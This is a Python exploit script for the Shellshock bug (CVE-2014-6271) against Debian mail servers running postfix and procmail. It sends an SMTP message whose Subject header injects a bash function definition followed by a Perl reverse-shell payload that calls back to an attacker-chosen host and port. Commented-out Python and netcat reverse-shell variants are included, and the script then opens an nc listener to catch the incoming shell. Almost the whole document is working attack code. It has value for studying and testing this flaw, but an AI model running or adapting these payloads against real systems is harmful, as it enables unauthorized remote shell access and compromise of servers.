#!/usr/bin/python
import sys,socket,subprocess

bnr = '''
###############################################################
# postfix + procmail + formail ShellShock Exploit             #
# Tested on: Debian 5 (postfix smtp,procmail)                 #
# By 3mrgnc3 06/02/2017                                       #
# CVE : 2014-6271                                             #
# Initiates a Reverse TCP connection                          #
# refs: https://www.exploit-db.com/exploits/34896/            #
#       https://gist.github.com/claudijd/33771b6c17bc2e4bc59c #
###############################################################
'''

try:
    target = sys.argv[1]
    email  = sys.argv[2]
    lhost  = sys.argv[3]
    lport  = sys.argv[4]
except IndexError:
    print bnr + '[!] A valid user email address on the target is required\r\n[?] Useage: %s <target-ip> <valid-email> <lhost> <lport>\r\n' % sys.argv[0] + '-' * 80
    sys.exit(1)

# reverse perl payload
pld = '''perl -e 'use Socket;$i="''' + lhost + '''";$p=''' + lport + ''';socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};' '''


# optional reverse python payload
#pld = '''python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("''' + lhost + '''",''' + lport + '''));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);' '''


# optional netcat payload
#pld = 'nc ' + lhost + ' ' + lport + ' -e /bin/bash'

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    print '#' * 55 + '\r\n[*] Connecting to target...'
    s.connect((target,25))
    s.recv(1024)
    s.send('mail from:<3mrgnc3>\r\n')
    s.recv(1024)
    s.send('rcpt to:<' + email + '>\r\n')
    s.recv(1024)
    s.send('data\r\n')
    s.recv(1024)
    s.send('To: <' + email + '>\r\nFrom: <' + email + '>\r\nSubject:() { :; };' + pld + '\r\nlove from 3mrgnc3\r\n\r\n.\r\nquit\r\n')
    print "[*] Payload Sent.\r\n[*] Wait for incomming shell\r\n[!] To spawn an interactive shell"
    print '''[!] Use: python -c 'import pty; pty.spawn("/bin/bash")'\r\n''' + '#'*55
    
except:
    print "[!] Can't connect to postfix Server!"

lnr = "nc -s " + lhost + " -nlp " + lport
try:
    ncl = subprocess.Popen(lnr, shell=True)
    ncl.poll()
    ncl.wait()
except:    
    print "\r[!] Shell Terminated!"
